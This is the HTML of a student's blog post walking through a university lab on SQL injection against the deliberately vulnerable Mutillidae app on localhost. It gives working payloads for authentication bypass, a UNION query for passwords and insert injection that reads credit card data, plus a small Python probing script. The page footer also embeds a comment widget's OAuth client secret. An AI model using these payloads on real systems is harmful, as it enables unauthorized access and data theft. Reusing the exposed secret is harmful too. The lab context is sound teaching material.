@@ -1,0 +1,571 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+	<!--pjax: don't stop the music-->
+  <script src="https://cdn.jsdelivr.net/npm/pjax@0.2.8/pjax.js"></script>
+  
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 5.4.0">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-icon-180x180.png">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32.png">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Merriweather:300,300italic,400,400italic,700,700italic|Syne+Mono:300,300italic,400,400italic,700,700italic|Abril+Fatface:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.15.1/css/all.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/npm/animate.css@3.1.1/animate.min.css">
+
+<script class="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"rdweirdo981.github.io","root":"/","images":"/images","scheme":"Pisces","version":"8.1.0","exturl":false,"sidebar":{"position":"left","display":"post","padding":18,"offset":12},"copycode":false,"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":false,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":"gitalk","storage":true,"lazyload":false,"nav":null,"activeClass":"gitalk"},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"prism":false,"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}};
+  </script>
+<meta name="description" content="This article is related to FIT5003 2020S2 Lab 9. The main aspects that these labs review are 3 types of SQL injection. We will discuss how to inject each of the vulnerability and how to defend the at">
+<meta property="og:type" content="article">
+<meta property="og:title" content="FIT5003 SQL Injection">
+<meta property="og:url" content="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/index.html">
+<meta property="og:site_name" content="Life φlosophy">
+<meta property="og:description" content="This article is related to FIT5003 2020S2 Lab 9. The main aspects that these labs review are 3 types of SQL injection. We will discuss how to inject each of the vulnerability and how to defend the at">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/1.bmp">
+<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/2.bmp">
+<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/3.bmp">
+<meta property="og:image" content="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/4.bmp">
+<meta property="article:published_time" content="2021-01-25T14:04:57.000Z">
+<meta property="article:modified_time" content="2023-01-29T13:05:00.877Z">
+<meta property="article:author" content="Daisy">
+<meta property="article:tag" content="SQLi">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/1.bmp">
+
+
+<link rel="canonical" href="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/">
+
+
+<script data-pjax class="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true,
+    lang   : 'en'
+  };
+</script>
+<title>FIT5003 SQL Injection | Life φlosophy</title>
+  
+
+
+
+  <noscript>
+  <style>
+  body { margin-top: 2rem; }
+
+  .use-motion .menu-item,
+  .use-motion .sidebar,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header {
+    visibility: visible;
+  }
+
+  .use-motion .header,
+  .use-motion .site-brand-container .toggle,
+  .use-motion .footer { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle,
+  .use-motion .custom-logo-image {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line {
+    transform: scaleX(1);
+  }
+
+  .search-pop-overlay, .sidebar-nav { display: none; }
+  .sidebar-panel { display: block; }
+  </style>
+</noscript>
+
+
+<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" class="use-motion">
+  <div class="headband"></div>
+
+  <main class="main">
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="Toggle navigation bar">
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+        <span class="toggle-line"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <a href="/" class="brand" rel="start">
+      <i class="logo-line"></i>
+      <h1 class="site-title">Life φlosophy</h1>
+      <i class="logo-line"></i>
+    </a>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+    </div>
+  </div>
+</div>
+
+
+
+<nav class="site-nav">
+  <ul class="main-menu menu">
+        <li class="menu-item menu-item-home"><a href="/" rel="section"><i class="fa fa-home fa-fw"></i>Home</a></li>
+        <li class="menu-item menu-item-about"><a href="/about/" rel="section"><i class="fa fa-user fa-fw"></i>About</a></li>
+        <li class="menu-item menu-item-tags"><a href="/tags/" rel="section"><i class="fa fa-tags fa-fw"></i>Tags</a></li>
+        <li class="menu-item menu-item-categories"><a href="/categories/" rel="section"><i class="fa fa-th fa-fw"></i>Categories</a></li>
+        <li class="menu-item menu-item-archives"><a href="/archives/" rel="section"><i class="fa fa-archive fa-fw"></i>Archives</a></li>
+        <li class="menu-item menu-item-collection"><a href="/collection/" rel="section"><i class="fa fa-globe fa-fw"></i>Resources</a></li>
+  </ul>
+</nav>
+
+
+
+
+</div>
+        
+  
+  <div class="toggle sidebar-toggle">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+
+  <aside class="sidebar">
+
+    <div class="sidebar-inner sidebar-nav-active sidebar-toc-active">
+		<iframe src="https://open.spotify.com/embed/track/5Q777K2mEK7lxZHROGIZrt?utm_source=generator" width="100%" height="80" frameBorder="0" allowfullscreen="" allow="autoplay; clipboard-write; encrypted-media; fullscreen; picture-in-picture"></iframe>
+      <ul class="sidebar-nav">
+        <li class="sidebar-nav-toc">
+          Table of Contents
+        </li>
+        <li class="sidebar-nav-overview">
+          Overview
+        </li>
+      </ul>
+
+      <div class="sidebar-panel-container">
+        <!--noindex-->
+        <section class="post-toc-wrap sidebar-panel">
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#week-9-lab---sql-injection"><span class="nav-number">1.</span> <span class="nav-text">Week 9 Lab - SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#introduction"><span class="nav-number">1.1.</span> <span class="nav-text">Introduction</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#environment-setup"><span class="nav-number">1.2.</span> <span class="nav-text">Environment Setup</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#program-requirements"><span class="nav-number">1.2.1.</span> <span class="nav-text">Program Requirements</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#setup-web-server"><span class="nav-number">1.2.2.</span> <span class="nav-text">Setup Web Server</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#sql-injection"><span class="nav-number">1.3.</span> <span class="nav-text">SQL Injection</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#bypass-authentication"><span class="nav-number">1.3.1.</span> <span class="nav-text">Bypass Authentication</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#extract-data"><span class="nav-number">1.3.2.</span> <span class="nav-text">Extract Data</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#task-1-2-extract-user-info"><span class="nav-number">1.3.2.1.</span> <span class="nav-text">Task 1 &amp; 2: Extract user
+info</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#task-3-other-data"><span class="nav-number">1.3.2.2.</span> <span class="nav-text">Task 3: Other data</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#insert-data"><span class="nav-number">1.3.3.</span> <span class="nav-text">Insert Data</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#automated-sql-injections"><span class="nav-number">1.3.4.</span> <span class="nav-text">Automated SQL injections</span></a></li></ol></li></ol></li></ol></div>
+        </section>
+        <!--/noindex-->
+
+        <section class="site-overview-wrap sidebar-panel">
+          <div class="site-author site-overview-item animated" itemprop="author" itemscope itemtype="http://schema.org/Person">
+    <img class="site-author-image" itemprop="image" alt="Daisy"
+      src="/images/avatar.jpg">
+  <p class="site-author-name" itemprop="name">Daisy</p>
+  <div class="site-description" itemprop="description">Cryptography | Mathematics | InfoSec | etc.</div>
+</div>
+<div class="site-state-wrap site-overview-item animated">
+  <nav class="site-state">
+      <div class="site-state-item site-state-posts">
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">30</span>
+          <span class="site-state-item-name">posts</span>
+        </a>
+      </div>
+      <div class="site-state-item site-state-categories">
+            <a href="/categories/">
+          
+        <span class="site-state-item-count">15</span>
+        <span class="site-state-item-name">categories</span></a>
+      </div>
+      <div class="site-state-item site-state-tags">
+            <a href="/tags/">
+          
+        <span class="site-state-item-count">37</span>
+        <span class="site-state-item-name">tags</span></a>
+      </div>
+  </nav>
+</div>
+
+
+
+        </section>
+      </div>
+    </div>
+  </aside>
+  <div class="sidebar-dimmer"></div>
+
+
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+
+    <div class="main-inner post posts-expand">
+
+
+  
+
+
+<div class="post-block">
+  
+  
+
+  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://rdweirdo981.github.io/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.jpg">
+      <meta itemprop="name" content="Daisy">
+      <meta itemprop="description" content="Cryptography | Mathematics | InfoSec | etc.">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="Life φlosophy">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          FIT5003 SQL Injection
+        </h1>
+
+        <div class="post-meta-container">
+          <div class="post-meta">
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar"></i>
+      </span>
+      <span class="post-meta-item-text">Posted on</span>
+
+      <time title="Created: 2021-01-25 22:04:57" itemprop="dateCreated datePublished" datetime="2021-01-25T22:04:57+08:00">2021-01-25</time>
+    </span>
+      <span class="post-meta-item">
+        <span class="post-meta-item-icon">
+          <i class="far fa-calendar-check"></i>
+        </span>
+        <span class="post-meta-item-text">Edited on</span>
+        <time title="Modified: 2023-01-29 21:05:00" itemprop="dateModified" datetime="2023-01-29T21:05:00+08:00">2023-01-29</time>
+      </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-folder"></i>
+      </span>
+      <span class="post-meta-item-text">In</span>
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/4-Master-of-Cybersecurity/" itemprop="url" rel="index"><span itemprop="name">4. Master of Cybersecurity</span></a>
+        </span>
+          , 
+        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+          <a href="/categories/4-Master-of-Cybersecurity/FIT5003-Software-Security/" itemprop="url" rel="index"><span itemprop="name">FIT5003 Software Security</span></a>
+        </span>
+    </span>
+
+  
+</div>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+        <center>
+This article is related to FIT5003 2020S2 Lab 9. The main aspects that
+these labs review are 3 types of SQL injection. We will discuss how to
+inject each of the vulnerability and how to defend the attacks.
+</center>
+<span id="more"></span>
+<p><br></p>
+<h1 id="week-9-lab---sql-injection">Week 9 Lab - SQL Injection</h1>
+<h2 id="introduction">Introduction</h2>
+<p>OWASP SQL Injection:
+https://owasp.org/www-community/attacks/SQL_Injection</p>
+<p>Reference: Week 9 Lab pdf</p>
+<h2 id="environment-setup">Environment Setup</h2>
+<h3 id="program-requirements">Program Requirements</h3>
+<ul>
+<li><p>OS: <strong>64-bit Ubuntu VM</strong></p></li>
+<li><p>Server: by <strong>XAMPP</strong>
+http://www.apachefriends.org/index.html</p></li>
+<li><p>Vulnerable Web App: <strong>Mutillidae</strong>
+https://github.com/webpwnized/mutillidae</p>
+<ul>
+<li><p>copy mutillidae directory (and all subdirectries) into
+/opt/lampp/htdocs:</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo cp -R ./mutillidae /opt/lampp/htdocs/</span></span><br></pre></td></tr></tbody></table></figure></li>
+<li><p>Helpful setting:</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo nano /opt/lampp/htdocs/mutillidae/includes/database-config.inc</span></span><br></pre></td></tr></tbody></table></figure>
+<p>In the editor, change the configuration as follows:</p>
+<figure class="highlight php"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">define(’DB_HOST’, ’<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>’);</span><br><span class="line">define(’DB_USERNAME’, ’root’);</span><br><span class="line">define(’DB_PASSWORD’, ’’);</span><br><span class="line">define(’DB_NAME’, ’mutillidae’);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></tbody></table></figure></li>
+</ul></li>
+<li><p>Web analysis tool: <strong>Burpsuite</strong>
+https://portswigger.net/burp/communitydownload</p></li>
+</ul>
+<h3 id="setup-web-server">Setup Web Server</h3>
+<p>XAMPP start:</p>
+<figure class="highlight shell"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash">sudo /opt/lampp/lampp start</span></span><br></pre></td></tr></tbody></table></figure>
+<p>And open Burpsuite to catch the data.</p>
+<ul>
+<li>set the IP as 127.0.0.1 and the port as 8080</li>
+</ul>
+<p>Open http://127.0.0.1/mutillidae/</p>
+<p><img src="/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/1.bmp"></p>
+<h2 id="sql-injection">SQL Injection</h2>
+<h3 id="bypass-authentication">Bypass Authentication</h3>
+<p>Practice version: 'OWASP 2017' --&gt; 'A1 – Injection (SQL)' --&gt;
+'SQLi – Bypass Authentication' --&gt; 'Login'</p>
+<p>Mission: Bypass authentication and login successfully.</p>
+<p>Answer code:</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">' OR 1=1 <span class="comment">-- </span></span><br></pre></td></tr></tbody></table></figure>
+<p>Result:</p>
+<p><img src="/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/2.bmp"></p>
+<p>Equivalent query:</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">''</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">-- AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
+<p><strong>Note</strong></p>
+<p>There must be a space after --. If there is not, the query will
+become to:</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">''</span> <span class="keyword">OR</span> <span class="number">1</span>=<span class="number">1</span> <span class="comment">--AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
+<p>This will cause a syntax error and the exception will be caught.</p>
+<h3 id="extract-data">Extract Data</h3>
+<p>Practice version: 'OWASP 2017' --&gt; 'A1 – Injection (SQL)' --&gt;
+'SQLi – Extract Data' --&gt; 'User Info'</p>
+<h4 id="task-1-2-extract-user-info">Task 1 &amp; 2: Extract user
+info</h4>
+<p>Mission: Display users' information</p>
+<p>Answer code:</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">John' <span class="comment">--</span></span><br></pre></td></tr></tbody></table></figure>
+<p>Result:</p>
+<p><img src="/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/3.bmp"></p>
+<p>Equivalent query:</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> * <span class="keyword">FROM</span> <span class="keyword">users</span> <span class="keyword">WHERE</span> username = <span class="string">'John'</span> <span class="comment">-- AND password = ''</span></span><br></pre></td></tr></tbody></table></figure>
+<p><strong>Note</strong></p>
+<p>You can also use the code in Bypass Authentication. The result will
+be all the users' information.</p>
+<h4 id="task-3-other-data">Task 3: Other data</h4>
+<p>Answer code:</p>
+<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">John' UNION SELECT NULL, password, NULL FROM accounts -- </span><br></pre></td></tr></tbody></table></figure>
+<p><strong>Note:</strong></p>
+<p>This is an unsolved task. I'll go back to this question once I find
+how to hack it.</p>
+<h3 id="insert-data">Insert Data</h3>
+<p>Practice version: 'OWASP 2017' --&gt; 'A1 – Injection (SQL)' --&gt;
+'SQLi – Insert Injection' --&gt; 'Register'</p>
+<p>Mission: Use 'Register' page to implement the malicious string and
+display users' information on the 'User info' page.</p>
+<p>Answer code:</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fish','42',(<span class="keyword">select</span> ccnumber <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">-- // For credit card number</span></span><br></pre></td></tr></tbody></table></figure>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fish','42',(<span class="keyword">select</span> expiration <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">--  // For expiration</span></span><br></pre></td></tr></tbody></table></figure>
+<p>Result:</p>
+<p><img src="/2021/01/25/Master-of-Cybersecurity/FIT5003/FIT5003%20SQLi/FIT5003/FIT5003%20XSS/4.bmp"></p>
+<p>Equivalent query:</p>
+<figure class="highlight sql"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">INSERT</span> <span class="keyword">INTO</span> accounts(username, <span class="keyword">password</span>, mysignature) <span class="keyword">VALUES</span>(<span class="string">'Fish'</span>,<span class="string">'42'</span>,(<span class="keyword">select</span> expiration <span class="keyword">from</span> credit_cards <span class="keyword">where</span> ccid=<span class="string">"1"</span>)) <span class="comment">-- ')</span></span><br></pre></td></tr></tbody></table></figure>
+<h3 id="automated-sql-injections">Automated SQL injections</h3>
+<p>AKA: how to find the vulnerability by using Python code</p>
+<figure class="highlight python"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line">proxies = {’http’:’http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>’,’https’:’http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>:<span class="number">8080</span>’}</span><br><span class="line"><span class="comment"># {key:value}</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(sys.argv) != <span class="number">2</span>:</span><br><span class="line">    	<span class="built_in">print</span> (<span class="string">"(+) Usage: %s &lt;sql-query-for-username&gt;"</span> % sys.argv[<span class="number">0</span>])</span><br><span class="line">    	sys.exit(-<span class="number">1</span>)</span><br><span class="line">        </span><br><span class="line">    username = sys.argv[<span class="number">1</span>]</span><br><span class="line">    target=<span class="string">"http://localhost/mutillidae/index.php?page=user-info.php&amp;username={}&amp;password=&amp;user-info-php-submit-button=View+Account+Details"</span>.<span class="built_in">format</span>(username)</span><br><span class="line">    </span><br><span class="line">    r = requests.get(target,proxies=proxies,allow_redirects=<span class="literal">False</span>) </span><br><span class="line">    <span class="comment">#requests.get(url, params={key: value}, args)</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(r.text) &gt; <span class="number">61000</span>:</span><br><span class="line">    	print(<span class="string">"(+) It works!"</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">    	print(<span class="string">"(-) It doesn’t work, try another query"</span>)</span><br><span class="line">        </span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">main()</span><br></pre></td></tr></tbody></table></figure>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/SQLi/" rel="tag"># SQLi</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/2021/01/22/Master-of-Cybersecurity/FIT5003/FIT5003%20Assignment%202/" rel="prev" title="FIT5003 Assignment 2 - SQLi, XSS, and CSRF in OWASP2017">
+                  <i class="fa fa-chevron-left"></i> FIT5003 Assignment 2 - SQLi, XSS, and CSRF in OWASP2017
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/2021/02/26/Master-of-Cybersecurity/FIT5003/FIT5003%20XSS/" rel="next" title="FIT5003 Cross-Site Scripting XSS">
+                  FIT5003 Cross-Site Scripting XSS <i class="fa fa-chevron-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+    <div class="comments" id="gitalk-container"></div>
+
+<script>
+  window.addEventListener('tabs:register', () => {
+    let { activeClass } = CONFIG.comments;
+    if (CONFIG.comments.storage) {
+      activeClass = localStorage.getItem('comments_active') || activeClass;
+    }
+    if (activeClass) {
+      const activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
+      if (activeTab) {
+        activeTab.click();
+      }
+    }
+  });
+  if (CONFIG.comments.storage) {
+    window.addEventListener('tabs:click', event => {
+      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
+      const commentClass = event.target.classList[1];
+      localStorage.setItem('comments_active', commentClass);
+    });
+  }
+</script>
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+
+<div class="copyright">
+  &copy; 
+  <span itemprop="copyrightYear">2023</span>
+  <span class="with-love">
+    <i class="fa fa-heart"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">Daisy</span>
+</div>
+  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" class="theme-link" rel="noopener" target="_blank">NexT.Pisces</a>
+  </div>
+
+
+  <script src='https://unpkg.com/mermaid@/dist/mermaid.min.js'></script>
+  <script>
+    if (window.mermaid) {
+      mermaid.initialize({theme: 'forest'});
+    }
+  </script>
+
+    </div>
+  </footer>
+
+  
+  <script src="//cdn.jsdelivr.net/npm/animejs@3.2.1/lib/anime.min.js"></script>
+  <script src="//cdn.jsdelivr.net/npm/@next-theme/pjax@0.4.0/pjax.min.js"></script>
+<script src="/js/utils.js"></script><script src="/js/motion.js"></script><script src="/js/next-boot.js"></script><script>
+var pjax = new Pjax({
+  selectors: [
+    'head title',
+    '.page-configurations',
+    '.main-inner',
+    '.post-toc-wrap',
+    '.languages',
+    '.pjax'
+  ],
+  analytics: false,
+  cacheBust: false,
+  scrollRestoration: false,
+  scrollTo: !CONFIG.bookmark.enable
+});
+
+document.addEventListener('pjax:success', () => {
+  pjax.executeScripts(document.querySelectorAll('script[data-pjax], .pjax script'));
+  NexT.boot.refresh();
+  // Define Motion Sequence & Bootstrap Motion.
+  if (CONFIG.motion.enable) {
+    NexT.motion.integrator
+      .init()
+      .add(NexT.motion.middleWares.subMenu)
+      .add(NexT.motion.middleWares.postList)
+      .bootstrap();
+  }
+  const hasTOC = document.querySelector('.post-toc');
+  document.querySelector('.sidebar-inner').classList.toggle('sidebar-nav-active', hasTOC);
+  document.querySelector(hasTOC ? '.sidebar-nav-toc' : '.sidebar-nav-overview').click();
+  NexT.utils.updateSidebarPosition();
+});
+</script>
+
+
+  
+
+
+
+
+
+<script data-pjax>
+if (document.querySelectorAll('.mermaid').length) {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/mermaid@8.8.3/dist/mermaid.min.js', () => {
+    mermaid.init({
+      theme    : 'dark',
+      logLevel : 3,
+      flowchart: { curve     : 'linear' },
+      gantt    : { axisFormat: '%m/%d/%Y' },
+      sequence : { actorMargin: 50 }
+    }, '.mermaid');
+  }, window.mermaid);
+}
+</script>
+
+
+  
+
+
+
+
+    <div class="pjax">
+
+  
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.css">
+
+<script>
+NexT.utils.loadComments('#gitalk-container', () => {
+  NexT.utils.getScript('//cdn.jsdelivr.net/npm/gitalk@1.7.0/dist/gitalk.min.js', () => {
+    var gitalk = new Gitalk({
+      clientID    : 'bf0bd12b8583ef8ad436',
+      clientSecret: 'f092c892e481e1251ac2eb285b2e4130b2de811b',
+      repo        : 'RdWeirdo981.github.io',
+      owner       : 'RdWeirdo981',
+      admin       : ['RdWeirdo981'],
+      id          : '9e2ed9adfd3329db83ad7f294f7b9d72',
+        language: 'en',
+      distractionFreeMode: true
+    });
+    gitalk.render('gitalk-container');
+  }, window.Gitalk);
+});
+</script>
+
+    </div>
+</body>
+</html>
